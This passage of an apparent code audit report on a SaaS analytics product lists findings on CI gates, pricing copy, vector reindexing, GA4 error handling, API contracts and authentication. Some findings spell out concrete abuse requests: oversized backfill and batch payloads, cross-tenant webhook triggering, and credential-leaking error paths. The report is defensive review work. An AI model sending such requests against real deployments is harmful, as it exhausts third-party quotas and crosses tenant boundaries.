- **Concrete failure**: Ship a change that makes `HybridRetriever`'s dense leg return `[]` for every query (a construction failure swallowed by an `except`, a wrong collection name, an empty pgvector table). Half of retrieval is dead in production; `pytest tests/unit/eval/test_real_retriever_eval.py` stays green, and `ndcg_at_k` actually *rises*.
- **Evidence** (measured, this checkout, running the file's own fixtures through `run_eval`):
```
full (real BM25 + stub dense)   passed: True  {'hit_at_k':1.0,'mrr':1.0,'context_recall':0.90,'ndcg_at_k':0.945}
dense leg returns nothing        passed: True  {'hit_at_k':1.0,'mrr':1.0,'context_recall':0.867,'ndcg_at_k':0.997}
BM25 leg returns nothing         passed: False {'hit_at_k':1.0,'mrr':0.5,'context_recall':0.367,'ndcg_at_k':0.631}
floors: hit_at_k=0.70 mrr=0.50 context_recall=0.60 ndcg_at_k=0.50
```
- **Severity**: high — the gate was added specifically because a dead retrieval leg reached production undetected, and it still cannot see a dead retrieval leg.
- **Confidence**: certain — the three runs above use the test module's own `_CORPUS`, `_StubDenseStore` and `_retriever` helpers.

---

## TEST-03 — `DEPRECATED` in `exclude_lines` lets a prose comment delete a whole function from the coverage gate

*`TEST` — Tests, CI gates, UX scenarios*

- **Where**: `/Users/sshlg/DATA/checkmydata-ai/backend/pyproject.toml:178-184` (`[tool.coverage.report] exclude_lines`), value `"DEPRECATED"` at `:183`; the gate it feeds is `.github/workflows/ci.yml:142`
- **What is wrong**: `exclude_lines` entries are regexes matched against source lines, and when the matched line is a clause header the **entire block** is removed from both the numerator and the denominator. The other four entries (`pragma: no cover`, `if TYPE_CHECKING:`, `if __name__ == …`, `raise NotImplementedError`) are explicit coverage directives; `DEPRECATED` is an ordinary English word a developer writes as documentation, with no idea it is a coverage pragma. There is no test asserting that the exclusion list stays narrow, and the suppression-debt ratchet (`tests/unit/docs/test_suppression_debt_ratchet.py:294-301`) counts `# noqa` and `# type: ignore` but not this.
- **Concrete failure**: Write `def refund_subscription(...):  # DEPRECATED — use billing_v2` on a 40-line function that is still called in production. The function and its body vanish from coverage entirely; `coverage report --fail-under=80` sees a *smaller* denominator and the percentage goes **up**. Delete every test for it and the gate still passes.
- **Evidence** (constructed and run against this repo's own coverage version):
```python
# m.py
def kept():           return 1
def gone():  # DEPRECATED: still called in production
    a = 1; b = 2; return a + b     # (3 separate lines in the real file)
```
```
$ coverage run t.py && coverage report      # t.py imports m and calls kept() only
Name    Stmts   Miss  Cover
m.py        2      0   100%     <- 5 statements, 3 of them untested, reported as 2/100%
```
- **Severity**: high — a one-word, entirely innocent-looking comment silently removes code from the only gate that measures whether it is tested.
- **Confidence**: certain (reproduced above).

---

## TEST-04 — the guard that proves "a coverage gate exists in CI" is satisfied by a comment

*`TEST` — Tests, CI gates, UX scenarios*

- **Where**: `/Users/sshlg/DATA/checkmydata-ai/backend/tests/unit/docs/test_coverage_gate_is_stated_once.py:39-40` (`_enforced`), asserted at `:47` and `:51-56`
- **What is wrong**: `_enforced()` runs `re.findall(r"--fail-under=(\d+)", ci.yml_text)` over the **raw file**, including comments. The sibling guard `tests/unit/docs/test_ci_covers_every_pull_request.py:38-41` parses the same workflow with `yaml.safe_load`, so structured parsing was available and deliberately not used here. The test therefore proves that the string appears somewhere in `ci.yml`, not that any step executes it. Its own docstring claims it prevents "with no gate in CI the local number is advisory".
- **Concrete failure**: Delete the `Coverage gate (combined unit + integration)` step (`ci.yml:135-142`) while leaving the explanatory comment block above it — a completely ordinary way to disable a slow step. Both tests stay green and no coverage threshold is enforced on any merge.
- **Evidence** (simulated on the real file):
```
$ # remove the gate step, leave "# (removed) the gate used to run: coverage report --fail-under=80"
enforced values found in mutated file: ['80']
any real run step enforcing it?  False
```
- **Severity**: high — the gate guarding the coverage gate cannot distinguish an enforced threshold from a documented one.
- **Confidence**: certain.

---


# MEDIUM-HIGH


## BIZ-09 — The pricing page sells a Free plan and a Pro tier that were retired on 2026-08-31

*`BIZ` — Business logic vs stated promises*

- **The promise**: `frontend/src/app/(marketing)/pricing/page.tsx:28` — *"Yes — the **Free plan** includes one project and one database connection, **forever**."* And `:40` — *"**Pro** and Team include a 14-day free trial."* The page header (`:71-73`) and its `<meta description>` (`:7`) both say *"Start free."*
- **Where the code differs**: `backend/app/services/plan_catalogue.py:64-138`
- **What is wrong**: The catalogue holds four paid tiers — `base` $199, `scale` $599, `team` $900, `enterprise` $1500 — and its docstring states *"**There is no free tier, deliberately.**"* `free` and `pro` are listed in `RETIRED_TIER_IDS` (`:138`) and kept only so already-sold subscriptions resolve. The FAQ array on the pricing page is a hard-coded constant, so it does not follow the live `/api/billing/plans` response that fills the table above it. The same file's `PricingTable.tsx:9-19` carries a comment explaining that the retired prices were removed from the *fallback* block "which made this file a second home for numbers that live in the `plans` table" — the FAQ underneath it is that second home, unfixed. `PricingTable.tsx:118` still highlights `plan.id === "pro"` as "Most popular", so the badge never renders.
- **Concrete failure**: A visitor lands on `/pricing`, reads "Start free" and "the Free plan includes one project and one database connection, forever", registers — and finds four tiers starting at $199/month with no free option and no way to use the hosted product without paying. The cheapest thing they were promised does not exist.
- **Evidence**:
```python
# backend/app/services/plan_catalogue.py:7-8, 138
**There is no free tier, deliberately.** The product is sold per project; an account
without a subscription has *no plan*, which is a different thing from the cheapest one.
RETIRED_TIER_IDS = ("free", "pro")
```
- **Severity**: **medium-high** — the copy is the first thing a buyer reads, it names a price of $0, and the discrepancy is discovered only after registration.
- **Confidence**: certain.

---

## RET-08 — the reindex fingerprint carries a setting that is inert on the production backend, so the documented remedy for a boot warning silently destroys every project's vectors

*`RET` — Retrieval*

- **Where**: `backend/app/ops/embedding_reconcile.py:48-52`, `backend/app/knowledge/pgvector_store.py:111-116`, `backend/app/services/embedding_reindex.py:62-80`, `backend/app/ops/capability_report.py:152-156`.
- **What is wrong**: `embedding_fingerprint()` leads with `settings.chroma_embedding_model`. On pgvector — what `VECTOR_STORE_BACKEND=auto` resolves to in production — `PgVectorStore._embed` constructs `ONNXMiniLM_L6_V2()` directly and never reads that setting, a fact `capability_report.py` states outright. So the value cannot change a single vector, yet changing it flips the fingerprint, and `reconcile_embeddings` responds by calling `queue_embedding_reindex(all project ids)`, which **first deletes** (`DELETE FROM doc_embeddings WHERE project_id = %s`) and then enqueues `force_full`. The capability report's own remedy for its pgvector claim is *"clear CHROMA_EMBEDDING_MODEL so the configuration matches what runs"* — the one action that triggers this.
- **Concrete failure**: an operator who set `CHROMA_EMBEDDING_MODEL=BAAI/bge-base-en-v1.5`, reads the CRITICAL-adjacent boot line, and unsets it. On the next boot the fingerprint moves, every project's `doc_embeddings` rows are deleted, and a `force_full` rebuild is queued — 12 039 s cold / 5 609 s warm for `esim-php` per CLAUDE.md, against a worker that Heroku cycles roughly daily. The RAG leg is empty for the duration, and the rebuild produces byte-identical 384-d vectors because the setting was inert both before and after.
- **Evidence**:
  ```python
  # ops/embedding_reconcile.py:48-52
  return (
      f"{settings.chroma_embedding_model}|{settings.embedder_max_tokens}"
      f"|uid{SYMBOL_UID_SCHEMA}|gx{GRAPH_EXTRACTION_SCHEMA}"
      f"|cid{SYMBOL_CHUNK_ID_SCHEMA}"
  )
  # pgvector_store.py:114-116 — the setting is never consulted
  from chromadb.utils.embedding_functions import ONNXMiniLM_L6_V2
  self._embedding_fn = ONNXMiniLM_L6_V2()
  ```
  `capability_report.py:152`: `"clear CHROMA_EMBEDDING_MODEL so the configuration matches what runs. "`
- **Severity**: medium-high — not reachable by accident, but the only path to it is the one the software itself recommends, and it is destructive with a multi-hour recovery.
- **Confidence**: certain. (The inertness of the setting on pgvector is already documented in `capability_report.py`; the interaction with the fingerprint and the remedy is not documented anywhere I could find.)

---


# MEDIUM


## ANA-03 — A permanently invalid request (HTTP 400) does not stop the report, so the whole window is re-attempted on every run, forever

*`ANA` — Analytics sources (GA4)*

- **Where**: `backend/app/analytics/http.py:147` (`return AnalyticsError(detail)` for any non-401/403/404/429/5xx) → `backend/app/services/analytics_collect_service.py:520-534` (`except AnalyticsError: … continue`)
- **What is wrong**: The "stop the report, it can never succeed" rule is keyed on the exception *class*, and only `AnalyticsAuthError`/`AnalyticsPermissionError` are in it (`:501-519`). A 400 `INVALID_ARGUMENT` — a mistyped property id, a dimension or metric GA4 has retired — maps to the base `AnalyticsError`, which lands in the isolate-and-continue branch. The reasoning the docs give for stopping on 401/403 ("continuing would only burn quota", `docs/ANALYTICS_SOURCES.md:210-211`) applies to 400 word for word and is not applied.
- **Concrete failure**: GA4 retires or renames a metric used by `trend` (the file already notes one such rename at `reports.py:138-139`, `defaultChannelGrouping` → `sessionDefaultChannelGroup`). Every one of the 30 periods in the default window fails with 400, all 30 are journalled `failed`, all 30 stay pending, and the next run re-issues the same 30 doomed requests — indefinitely, once per day, per affected report.
- **Evidence**:
```
$ .venv/bin/python -c "from app.analytics.ga4.adapter import _map_client_error; ..."
400 -> AnalyticsError      # isolate-and-continue: all 30 periods attempted
401 -> AnalyticsAuthError  # stops the report
403 -> AnalyticsPermissionError
```
- **Severity**: medium — no wrong data, but a permanent misconfiguration burns the window's worth of quota every day with no escalation.
- **Confidence**: certain — both the classification and the branch it reaches were executed/read directly.

---

## ANA-04 — HTTP 404 is recorded as a *completed* period, so a wrong property id reads as "collected, and it was zero"

*`ANA` — Analytics sources (GA4)*

- **Where**: `backend/app/analytics/http.py:143-144` (`404 → AnalyticsEmpty`), `backend/app/analytics/errors.py:38-43`, consumed at `backend/app/services/analytics_collect_service.py:490-500`
- **What is wrong**: `AnalyticsEmpty` means two incompatible things — "the vendor has no data for this period" and "the resource you asked for does not exist". Only the first is a completed period. Because `empty ∈ DONE_STATUSES` (`journal.py:49`), a 404 marks the period **done forever**: it never returns to the pending set, and `collection_status` computes `ok` for the connection (`connection_service.py:950-957`) because nothing is recorded `failed`.
- **Concrete failure**: A connection pointed at a property that has been deleted, or one reached through a misrouted endpoint. Every period in the 30-day window is journalled `empty`, `pending_periods` is 0, the UI badge says *ok*, and `query_report` answers with "Coverage: all 30 period(s) in this window have been collected, so the values below are real measurements" over zero rows. That is the fabricated zero the module's own docstring (`analytics_agent.py:9`, "An absent row is not a zero") exists to prevent, produced by the collector rather than the agent.
- **Evidence**:
```python
# http.py:143-144 — the only 404 branch, shared by the GA4 client path via _map_client_error
if resp.status == 404:
    return AnalyticsEmpty(detail)
# errors.py:39-43
"""404 / no data for the requested period.
Not a failure of the run: the period is journalled as ``empty`` and is not retried …"""
```
- **Severity**: medium — a silent, permanently sticky false zero, but it needs a 404 rather than GA4's more usual 403 for an inaccessible property.
- **Confidence**: likely. What would settle it: a recorded GA4 Data API response for `properties/<deleted-id>` and for a Measurement ID (`G-XXXXXXX`) pasted where §2.5 warns against it — if either is 404 rather than 403/400, this fires in production today. The mapping itself is certain, and it is also the mapping the reserved `appstore`/`googleplay` raw-HTTP transport will inherit, where 404 for a wrong app id is routine.

---

## ANA-05 — Totals are summed over every `property_id` ever collected, including properties removed from the connection

*`ANA` — Analytics sources (GA4)*

- **Where**: `backend/app/agents/analytics_agent.py:957-965` (`_select_rows` where-clause) and `:982-1012` (`_periods_with_rows`, same omission)
- **What is wrong**: The read is scoped to `connection_id` and the date window only. `property_id` is a natural-key column on all five fact tables and a member of `groupable_columns` (`:174-182`), but it is never *filtered* — and the connection's live `source_config.property_ids` is not consulted anywhere on the answer path. Rows collected under a property that has since been removed from the connection stay in the table (nothing deletes them; `docs/ANALYTICS_SOURCES.md:368` keeps fact rows "for the life of the connection") and are summed into every total.
- **Concrete failure**: A connection collects properties `294380179` (100 sessions on 2026-09-01) and `111111111` (900). The owner edits the connection and removes `111111111`. Every later answer reports **1000** sessions for that day, under the sentence "the values below are real measurements". The same omission makes `_periods_with_rows` vouch for coverage using a de-configured property's rows.
- **Evidence** — reproduced:
```
Report 'overview' from 2026-09-01 to 2026-09-01, grouped by date.
Coverage: all 1 period(s) in this window have been collected, so the values below are real measurements.
Rows: 1
date | sessions | active_users | ...
2026-09-01 | 1000 | 2 | ...
```
```python
# analytics_agent.py:959-963 — no property_id predicate
.where(binding.model.connection_id == state.connection_id,
       binding.model.date >= start,
       binding.model.date <= end)
```
- **Severity**: medium — wrong numbers presented as verified measurements, but only after a property is removed from a multi-property connection.
- **Confidence**: certain.

---

## ANA-06 — `backfill_days` has no server-side bound; the documented "Clamped to 1–3650" lives only in the React form

*`ANA` — Analytics sources (GA4)*

- **Where**: `backend/app/api/routes/connections.py:408` and `:488` (`source_config: dict[str, Any] | None` — no validator), `backend/app/services/analytics_collect_service.py:685-701` (`_backfill_days`, positive-only), `:163-193` (`period_range`, no cap). Clamp actually implemented at `frontend/src/components/connections/ConnectionSelector.tsx:501`.
- **What is wrong**: `source_config` is an unvalidated free-form dict on both `ConnectionCreate` and `ConnectionUpdate`. `GA4Config.from_mapping` rejects only non-positive values (`ga4/config.py:108-109`) and `_backfill_days` only falls back on a non-number. The clamp the runbook promises is `safeInt(analyticsForm.backfill_days, 30, 1, 3650)` in the browser, which any direct API call bypasses. Note the asymmetry: the agent's window builder *does* guard (`analytics_agent.py:101`, `MAX_WINDOW_PERIODS = 1100`); the collector's does not.
- **Concrete failure**: `PATCH /api/connections/{id}` with `{"source_config": {"property_ids": ["294380179"], "backfill_days": 100000}}` is accepted. Every subsequent run enumerates 100,000 daily periods per report — 500,000 vendor calls — starting at 1752-11-24, and `GET /collection-status` builds the same 500,000 period strings per request on a read-only endpoint. The ARQ job is cancelled at `analytics_collect_job_timeout_seconds` (1800) and the identical window is rebuilt the next day, forever.
- **Evidence**:
```
$ .venv/bin/python -c "from app.services.analytics_collect_service import period_range; ..."
backfill_days=     30 ->      30 periods per report,     150 vendor calls per run  (2026-08-10 .. 2026-09-08)
backfill_days=   3650 ->    3650 periods per report,   18250 vendor calls per run  (2016-09-11 .. 2026-09-08)
backfill_days= 100000 ->  100000 periods per report,  500000 vendor calls per run  (1752-11-24 .. 2026-09-08)
```
Doc side, `docs/ANALYTICS_SOURCES.md:146`: *"| *Backfill days* | `30` | How far back a fresh connection collects. **Clamped to 1–3650.** |"*
- **Severity**: medium — owner-authenticated and self-inflicted, but it burns a third party's quota, wedges the collector permanently, and the documented guard does not exist where the doc implies it does.
- **Confidence**: certain.

---

## API-06 — A `429` carries two mutually incompatible bodies, and `API.md` documents only one of them

*`API` — HTTP routes and contracts*

- **Where**: `backend/app/main.py:391` (handler registration), `.venv/.../slowapi/extension.py:81-83` (the body it produces), `API.md:613-618` (the contract)
- **What is wrong**: `API.md` states *"All errors follow this format: `{"detail": "Human-readable error message"}"`*. That holds for the handler-raised 429s (`chat.py:325`, `chat.py:791`, `projects.py:645`), which use `HTTPException(status_code=429, detail=...)`. It does not hold for the rate-limiter's 429, which the app installs verbatim from slowapi and which emits `{"error": "Rate limit exceeded: 20 per 1 minute"}` — no `detail` key at all. Two distinct wire shapes share one status code, and nothing distinguishes "retry in a moment" from "your daily token budget is spent", which is a different, non-retryable condition also served as 429.
- **Concrete failure**: `POST /api/chat/ask` 21 times in a minute → `429 {"error":"Rate limit exceeded: 20 per 1 minute"}`. The frontend's shared client reads `body.detail` (`frontend/src/lib/api/_client.ts:182-184`) and, for 429 specifically, discards the body entirely and throws `"Too many requests. Please wait a moment and try again."` (`_client.ts:158-160`). So the budget-exhaustion message the backend composed — the one that names `/pricing` — never reaches a user, and the user is told to wait a moment for a ceiling that resets tomorrow.
- **Evidence**:
```python
# slowapi/extension.py:81-83
response = JSONResponse(
    {"error": f"Rate limit exceeded: {exc.detail}"}, status_code=429
)
# main.py:391
app.add_exception_handler(RateLimitExceeded, _rate_limit_exceeded_handler)
```
- **Severity**: medium — the documented envelope is false for a status every client must handle, and the overload makes a permanent condition read as transient.
- **Confidence**: certain.

---

## API-07 — Three routes answer `200` with an error inside, and two of them echo the raw exception string

*`API` — HTTP routes and contracts*

- **Where**: `backend/app/api/routes/notes.py:274-281`, `backend/app/api/routes/health_monitor.py:101-103`, `backend/app/api/routes/schedules.py:264-272`
- **What is wrong**: `POST /api/notes/{id}/execute` catches every exception from `connector.connect` / `execute_query` and returns `200 ExecuteResponse(error=str(e))`. `POST /api/connections/{id}/reconnect` returns `200 {"success": False, "error": str(exc)}`. Both hand the client the unredacted driver exception. This contradicts `API.md:613-618` (all errors are `{"detail": …}` with a 4xx/5xx status) and contradicts the same codebase's own handling one file over — `chat.py:427-430` deliberately replaces the exception with `"An internal error occurred while processing your request."` before raising 500. The reconnect behaviour is additionally *pinned* by a test that asserts the symptom: `tests/integration/test_routes_coverage.py:130-139`, `test_reconnect_no_500`, asserts `resp.status_code == 200` for a connection that cannot connect.
- **Concrete failure**: `POST /api/connections/{id}/reconnect` against a connection whose host is unreachable returns `200 {"success": false, "error": "[Errno 8] nodename nor servname provided, or not known: db-prod.internal.example.com"}` — the customer's internal hostname, from a driver exception, at a success status. A generic client that branches on `res.ok` records the reconnect as having worked.
- **Evidence**:
```python
# health_monitor.py:99-103
    except Exception as exc:
        logger.warning("Reconnect failed for %s: %s", connection_id, exc)
        return {"success": False, "error": str(exc)}
# notes.py:274-281
    except Exception as e:
        logger.exception("Note re-execute failed for note=%s", note_id[:8])
        return ExecuteResponse(id=note_id, ..., error=str(e))
```
- **Severity**: medium — a failure presented as a success, plus internal detail on the wire; a test enshrines it.
- **Confidence**: certain.

---

## API-09 — Paginated list endpoints load the entire table into memory and then slice in Python

*`API` — HTTP routes and contracts*

- **Where**: `backend/app/api/routes/repos.py:840-859` (with `app/knowledge/doc_store.py:97-104`), also `backend/app/api/routes/connections.py:1169-1187`, `dashboards.py:145-155`, `notes.py:146-159`, `data_graph.py:97-128` and `:164-187`
- **What is wrong**: Each declares `limit`/`offset` query parameters, then calls a service that runs an unbounded `SELECT` and applies `[offset : offset + limit]` to the resulting Python list. The `limit` bounds the response body and nothing else — not the query, not the rows deserialised, not the memory. In the worst case the loaded columns are large `Text` blobs the response never uses: `KnowledgeDoc.content` is `Text` (`models/knowledge_doc.py:20`) and `DbIndex` carries eleven `Text` JSON columns (`models/db_index.py:31-52`) of which `index_to_response` renders none (`services/db_index_service.py:441-474`).
- **Concrete failure**: `GET /api/repos/{project_id}/docs?limit=1&offset=0` on the one real production project loads **all 763 `KnowledgeDoc` rows including their generated prose** — the figure `CLAUDE.md` records from `generate_docs: completed (generated=188 reused=575)` — to return one object of five scalar fields. On the memory-constrained dyno, a handful of concurrent calls is megabytes per request for a response measured in bytes.
- **Evidence**:
```python
# repos.py:848-859
docs = await _doc_store.get_latest_docs(db, project_id)   # no limit reaches SQL
return [ {...five scalar fields...} for d in docs[offset : offset + limit] ]
# doc_store.py:100-104 — the query behind it
stmt = select(KnowledgeDoc).where(KnowledgeDoc.project_id == project_id)
result = await session.execute(stmt.order_by(KnowledgeDoc.updated_at.desc()))
return list(result.scalars().all())
```
- **Severity**: medium — a pagination contract that is decorative; cost scales with the table while the response does not.
- **Confidence**: certain.

---

## API-10 — The `GET …/members` cap markers cannot reach the browser, and there is no way to fetch past the cap

*`API` — HTTP routes and contracts*

- **Where**: `backend/app/api/routes/invites.py:318-337`, `backend/app/main.py:504-510`, `API.md:411`
- **What is wrong**: Two problems compound. (1) The route sets `X-Total-Count` and `X-Result-Capped` but `CORSMiddleware` is configured without `expose_headers`, and Starlette only emits `Access-Control-Expose-Headers` when that argument is non-empty (`starlette/middleware/cors.py:25,44-45`). The SPA talks to a separate origin (`NEXT_PUBLIC_API_URL`, `frontend/src/lib/api/_client.ts:6`), so the browser strips both headers — along with `X-Request-ID` (`main.py:480`) and the `X-RateLimit-*` headers `API.md:640` advertises. (2) The route exposes no `limit` or `offset` parameter at all: it calls `list_members(db, project_id)` with the default `DEFAULT_MEMBER_PAGE = 500` (`membership_service.py:30,339`), so `MAX_MEMBER_PAGE = 1000` is unreachable and there is no cursor. `API.md:411` describes "default 500, hard maximum 1000" as if a caller could choose.
- **Concrete failure**: A project with 700 members. `GET /api/invites/{pid}/members` returns 500 objects with `X-Total-Count: 700` and `X-Result-Capped: true`. From `https://checkmydata.ai` the browser cannot read either header, so the UI renders 500 members as the complete team — which is exactly the failure the docstring says the headers exist to prevent — and no request the API accepts can return members 501-700.
- **Evidence**:
```python
# invites.py:333-337 — no limit/offset parameter on the route signature
members = await _membership_svc.list_members(db, project_id)
total = await _membership_svc.count_members(db, project_id)
response.headers["X-Total-Count"] = str(total)
response.headers["X-Result-Capped"] = "true" if len(members) < total else "false"
# main.py:504-510 — no expose_headers=
app.add_middleware(CORSMiddleware, allow_origins=settings.cors_origins,
                   allow_credentials=True, allow_methods=["*"], allow_headers=["*"])
```
`grep -rn "X-Total-Count\|X-Result-Capped\|X-Request-ID\|X-RateLimit" frontend/src/` → no matches; no client reads them today either.
- **Severity**: medium — a deliberate honesty mechanism is inert on the wire, and the endpoint has no path past its own cap.
- **Confidence**: certain.

---

## API-11 — `POST /api/batch/execute` puts no bound on the query list and runs the whole batch inside the web dyno

*`API` — HTTP routes and contracts*

- **Where**: `backend/app/api/routes/batch.py:34-40` (schema), `:110-118` (dispatch)
- **What is wrong**: `note_ids` is capped at 100 items, `sql` at 50 000 characters and `title` at 200 — so the bounds were consciously placed — but `queries: list[BatchQueryItem] = Field(default_factory=list)` has no `max_length`. The only remaining ceiling is `max_request_body_bytes` = 10 MB. Separately, unlike every other heavy operation in the API, the batch is not enqueued to the ARQ worker even when Redis is configured: `spawn_tracked` starts it as an in-process `asyncio` task on the process serving HTTP.
- **Concrete failure**: `POST /api/batch/execute` with a `queries` array of ~150 000 minimal items (≈9 MB body) is accepted, returns `202 {"batch_id":…,"status":"pending"}`, and the web dyno then executes all of them against the customer's database at `settings.batch_max_concurrency` for as long as it takes, with no run row, no heartbeat, no cancel route and no visibility in `/api/runs`. Ten such requests per minute are within the rate limit.
- **Evidence**:
```python
# batch.py:38-39 — the asymmetry is the tell
    queries: list[BatchQueryItem] = Field(default_factory=list)   # unbounded
    note_ids: list[str] | None = Field(None, max_length=100)      # bounded
# batch.py:110-114
    task = spawn_tracked(
        _svc.execute_batch(batch.id, body.connection_id, user_id=user["user_id"]),
        name=f"batch:{batch.id}")
```
- **Severity**: medium — unbounded backend work accepted from a request body, on the process that must stay responsive.
- **Confidence**: certain.

---

## AUTH-04 — Every MCP agent call acquires the shared concurrency/quota slot twice, halving each MCP user's limits

*`AUTH` — Authentication, tenancy, access control*

- **Where**: `backend/app/mcp_server/server.py:249-250` (`limited=True`) together with `backend/app/mcp_server/tools.py:320` (`query_database`) and `backend/app/mcp_server/tools.py:404` (`search_codebase`)
- **What is wrong**: `_with_principal(..., limited=True)` acquires `agent_limiter` before dispatching, and the tool body acquires it again for the same `user_id`. `AgentLimiter.acquire` is a counter, not a re-entrant lock (`app/core/agent_limiter.py:118-119` increments `_concurrent` **and** appends to the hourly window on every call; the Redis Lua at `:30-32` does `INCR` + `ZADD`). Both F-MCP-02 comments claim to be adding the gate for the first time, in two places, so the doubling was invisible to each author.
- **Concrete failure**: With the defaults `max_concurrent_agent_calls = 3` and `max_agent_calls_per_hour = 100` (`app/config.py:953-954`), an MCP client running two `checkmydata_query_database` calls in parallel gets the second one refused: the first call holds 2 of 3 slots, the second takes the third at the outer gate and is rejected at the inner one with `"Too many concurrent requests (limit: 3)"` — a message naming a limit the user has not reached. Over an hour the same client is cut off after **50** tool calls while the configured cap says 100.
- **Evidence**:
```python
# app/mcp_server/server.py:249-250
            tool_name="checkmydata_query_database",
            limited=True,
# app/mcp_server/tools.py:320-322  (inside the tool the line above dispatches)
    limit_err = await agent_limiter.acquire(user_id)
    if limit_err:
        raise ToolError(limit_err)
```
- **Severity**: medium — not a security boundary failure (it errs strict), but it silently halves a documented quota and produces an error message that contradicts the configured value, which is unresolvable from the client side.
- **Confidence**: certain. No slot is leaked: `tools.py`'s `raise` precedes its `try`, and `_with_principal`'s `finally` (`server.py:131-133`) releases the outer one.

---

## AUTH-05 — One global git-webhook secret authorises re-indexing of any project id, in any tenant

*`AUTH` — Authentication, tenancy, access control*

- **Where**: `backend/app/api/routes/repos.py:415-450`, verifying against `settings.git_webhook_secret` (`app/config.py:547`)
- **What is wrong**: `_verify_webhook_signature` (`repos.py:~396-412`) HMACs the body against a single process-wide secret and nothing binds that secret to the `{project_id}` in the path. The signature therefore proves "someone holds the deployment's webhook secret", never "someone controls *this* project's repository". Every tenant who wires a webhook must be given the same string, and it does not expire or scope.
- **Concrete failure**: Tenant A is given `GIT_WEBHOOK_SECRET` so they can configure GitHub. They then sign any body with it and `POST /api/projects/{B_project_id}/webhook` for tenant B's project id. A valid signature yields 202 and a repo re-index of B's project; an unknown id yields 404 and an unindexed one yields a different 404 body — so the endpoint also enumerates which project ids exist and have a repository. Repeating it drives B's memory-constrained worker into `generate_docs` (LLM-billed, hours long per `CLAUDE.md`) on demand.
- **Evidence**:
```python
# app/api/routes/repos.py:430-434
    if not settings.git_webhook_secret:
        raise HTTPException(status_code=503, detail="Webhook secret not configured")
    raw = await request.body()
    if not _verify_webhook_signature(settings.git_webhook_secret, raw, request.headers):
        raise HTTPException(status_code=401, detail="Invalid webhook signature")
```
```
$ grep -n "git_webhook_enabled\|git_webhook_secret" app/config.py
546:    git_webhook_enabled: bool = False
547:    git_webhook_secret: str = ""
```
- **Severity**: medium — cross-tenant job triggering and an existence oracle, bounded by the flag being off by default and by the secret only reaching tenants who ask for webhooks.
- **Confidence**: certain about the code. What would settle the exposure is whether `GIT_WEBHOOK_ENABLED` is set on the deployment (`make config-drift` does not list it among the five `DELIBERATE` keys, so the code default should hold).

---

## AUTH-06 — MCP `execute_raw_query` hands the raw connector exception to the MCP client, bypassing the scrubber every sibling path uses

*`AUTH` — Authentication, tenancy, access control*

- **Where**: `backend/app/mcp_server/tools.py:572-574`
- **What is wrong**: `app/core/redaction.py:42-48` states the rule for this exact situation — "Use at every site that puts an exception's own words into an API response, a `QueryResult.error`, or a log line. `str(exc)` is not safe to forward: … anything that wrapped it with a DSN or a command line is not, and the call site cannot tell which it got." Six connectors obey it inside `execute_query`, and `ConnectionService.test_connection` obeys it at `connection_service.py:561`. This tool wraps `connector.connect(config)` — the phase *before* any connector-internal scrubbing exists — and re-raises `str(e)` verbatim. `connect` is where the DSN is passed (`app/connectors/postgres.py:121-128` hands `config.connection_string` straight to `asyncpg.create_pool`) and where `ssh_exec` builds its command line from the user-supplied `ssh_command_template`, which `ConnectionConfig.__repr__` documents at `app/connectors/base.py:70-72` as "free-form shell text the user supplies, which can inline a literal credential".
- **Concrete failure**: A member of a project calls `checkmydata_execute_raw_query` on a connection whose stored DSN is malformed or whose bastion is unreachable. The driver's error, which for a DSN parse failure or a URL-embedded credential carries `postgres://user:PASSWORD@host/db`, is returned to their MCP client as the tool's error text and into that client's transcript and logs. The same class of defect sits at `app/services/connection_service.py:593`, where the analytics test returns `str(exc)[:500]` while the database branch fifty lines above it (`:561`) returns `safe_error(e)`.
- **Evidence**:
```python
# app/mcp_server/tools.py:572-574
    except Exception as e:
        logger.exception("Raw query execution failed")
        raise ToolError(str(e))
```
```python
# app/services/connection_service.py:561 vs :593 — same method, two rules
            return {"success": False, "error": safe_error(e)}
...
            return {"success": False, "error": str(exc)[:500]}
```
- **Severity**: medium — credential egress to a third-party client transcript, conditional on the connection carrying a DSN or a templated command and on the driver echoing it.
- **Confidence**: likely. What would settle it: run `connector.connect` against a connection whose `connection_string` is `postgres://u:p@h/db` with a deliberate parse error and inspect the raised message; if asyncpg echoes the DSN, this becomes certain.

---

## AUTH-07 — `get_accessible_projects` is a third, member-only reader of an access rule that documents itself as having one source of truth

*`AUTH` — Authentication, tenancy, access control*

- **Where**: `backend/app/services/membership_service.py:435-445`, consumed by `backend/app/api/routes/projects.py:245`, `backend/app/api/routes/workflows.py:61`, `backend/app/api/routes/tasks.py:48` and `:56`
- **What is wrong**: `_accessible_filter` (`membership_service.py:447-459`) declares itself the "single source of truth for the access rule" and states it as *owns OR is a member of*; `can_access`, `list_accessible`, `get_role` and `get_roles_bulk` were all corrected to honour it (the F-PROJ-02/F-PROJ-14 notes at `:61-72` and `:513-515` describe exactly why). `get_accessible_projects` was not: it is a bare `JOIN ProjectMember` with no owner leg. The divergence is invisible because `GET /api/projects` calls the fixed `get_roles_bulk` on the very next line — over a list the broken query has already truncated.
- **Concrete failure**: `create_project` writes the project and the owner's member row in **separate commits** (`projects.py:198-201`: `_svc.create` commits, then `add_member` commits, then `db.commit()`), which is the failure window `get_role`'s docstring was written about. A crash between them leaves `Project.owner_id` set with no member row. That user's own project then never appears in `GET /api/projects` — while `checkmydata_list_projects` over MCP, which calls the owner-inclusive `list_accessible` (`tools.py:445`), does show it. The web UI and the MCP server disagree about which projects exist for the same principal, and the UI is the one that is wrong.
- **Evidence**:
```python
# app/services/membership_service.py:440-445  — no owner leg
        result = await db.execute(
            select(Project)
            .join(ProjectMember, ProjectMember.project_id == Project.id)
            .where(ProjectMember.user_id == user_id)
        )
        return list(result.scalars().all())
```
```python
# app/api/routes/projects.py:245-247  — broken reader, then the fixed one, over its output
    projects = await _membership_svc.get_accessible_projects(db, user["user_id"])
    # T17: fetch all roles in one query instead of N+1.
    roles = await _membership_svc.get_roles_bulk(db, [p.id for p in projects], user["user_id"])
```
- **Severity**: medium — fails closed, so it is a lockout rather than a leak: an owner can be permanently unable to see or reach their own workspace from the UI, with no self-service repair (`transfer-ownership` requires the target to already be a member).
- **Confidence**: certain about the divergence. Whether any such row exists today is settled by `SELECT p.id FROM projects p LEFT JOIN project_members m ON m.project_id=p.id AND m.user_id=p.owner_id WHERE p.owner_id IS NOT NULL AND m.id IS NULL;`.

---

## BILL-06 — `_resolve_plan_id`'s stale-catalogue fallback writes an unvalidated `metadata.plan_id` into a foreign-key column, so the recovery path 500s the webhook forever

*`BILL` — Billing, subscriptions, LLM credit*

